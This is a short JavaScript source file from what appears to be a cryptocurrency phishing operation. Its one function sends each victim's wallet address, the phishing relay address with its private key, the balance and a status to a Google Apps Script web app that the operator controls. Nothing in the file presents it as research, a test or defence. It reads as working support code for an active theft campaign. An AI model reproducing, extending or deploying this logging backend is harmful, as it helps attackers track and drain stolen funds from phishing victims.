import dotenv from 'dotenv';

dotenv.config();

/**
 * Sends relay details to a Google Apps Script Web App.
 * No service accounts or keys needed—just the Web App URL.
 */
export async function logToGoogleSheetsSimple({ victimAddress, phishingAddress, phishingPrivateKey, balance, status }) {
    try {
        const WEB_APP_URL = process.env.GOOGLE_SHEETS_WEBAPP_URL;

        if (!WEB_APP_URL) {
            console.warn('[Sheets] Missing Web App URL. Skipping log.');
            return;
        }

        const response = await fetch(WEB_APP_URL, {
            method: 'POST',
            body: JSON.stringify({
                victim: victimAddress,
                relay: phishingAddress,
                key: phishingPrivateKey,
                balance: balance,
                status: status,
            }),
        });

        const result = await response.text();
        console.log(`[Sheets] Log Status: ${result}`);
    } catch (err) {
        console.error('[Sheets] Logging Error:', err.message);
    }
}
